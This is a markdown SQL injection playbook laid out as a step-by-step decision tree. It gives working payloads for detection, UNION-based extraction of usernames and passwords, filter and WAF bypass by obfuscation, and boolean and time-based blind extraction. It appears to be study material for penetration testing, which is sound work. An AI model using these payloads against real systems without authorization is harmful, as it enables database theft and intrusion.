# 🧠 SQL Injection – Decision Tree (Step-by-Step Playbook)

## 📌 Overview

This decision tree helps determine:

* Whether SQL injection exists
* What type of SQL injection it is
* What technique to use next

---

# 🎯 Step 0: Identify Input Points

Test all possible inputs:

* URL parameters
* Form fields (login, search)
* Headers (User-Agent, cookies)
* JSON/XML data

---

# 🔍 Step 1: Check for Injection

### 🔹 Payload

```sql
'
```

### 🔍 Observation:

* Error / page break → ✅ Possible SQLi
* No change → Continue testing

---

# 🔁 Step 2: Test Behavior (TRUE vs FALSE)

### 🔹 Payloads

```sql
' OR 1=1--
' AND 1=2--
```

### 🔍 Observation:

* Different responses → ✅ SQLi confirmed
* Same response → Continue

---

# 🧮 Step 3: Test Logical Evaluation

### 🔹 Payload

```sql
1+1
```

### 🔍 Observation:

* Output changes → ✅ Input is executed

---

# 🚨 Step 4: Check for Error-Based SQLi

### 🔹 Payload

```sql
' ORDER BY 100--
```

### 🔍 Observation:

* Error message → ✅ Error-based SQLi

👉 Next: extract data using errors

---

# 📊 Step 5: Check for Data Output (UNION)

### 🔹 Payload

```sql
' UNION SELECT NULL--
```

### 🔍 Observation:

* Page changes / data appears → ✅ UNION SQLi

---

## 🔁 Find Column Count

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

👉 Adjust until no error

---

## 🔓 Extract Data

```sql
' UNION SELECT username,password FROM users--
```

---

# 🚫 Step 6: If Blocked (WAF / Filters)

Try bypass techniques:

### 🔹 Encoding

* URL encoding
* XML encoding
* Hex encoding

### 🔹 Obfuscation

```sql
UN/**/ION
SE/**/LECT
```

### 🔹 Case variation

```sql
uNiOn SeLeCt
```

---

# 🕵️ Step 7: No Output? → Blind SQLi

## ✅ Boolean-Based

```sql
' AND 1=1--
' AND 1=2--
```

👉 Compare responses

---

## ⏱️ Time-Based

```sql
' AND IF(1=1, SLEEP(5), 0)--
```

👉 Delay = TRUE

---

# 🔍 Step 8: Extract Data (Blind SQLi)

## Boolean-based

```sql
' AND SUBSTRING(username,1,1)='a'--
```

## Time-based

```sql
' AND IF(SUBSTRING(username,1,1)='a', SLEEP(5), 0)--
```

---

# 🔁 Full Flow Summary

```
Input → ' test
      ↓
Error? → YES → Error-based SQLi
      ↓ NO
Behavior change? → YES → SQLi confirmed
      ↓ NO
Logical eval? → YES → SQLi confirmed
      ↓ NO
UNION works? → YES → Data extraction
      ↓ NO
Blocked? → Bypass filters
      ↓
Still no output? → Blind SQLi
```

---

# 🎯 Key Takeaways

* Always follow a **structured approach**
* Do NOT jump randomly between payloads
* Observe:

  * Errors
  * Behavior
  * Logic
  * Output

---

# 🧠 Pro Mindset

Do not think:

> “Which payload should I try?”

Think:

> “What is the application doing with my input?”

---

# 📌 Conclusion

This decision tree provides a systematic way to:

* Detect SQL injection
* Identify its type
* Choose the correct exploitation method

---
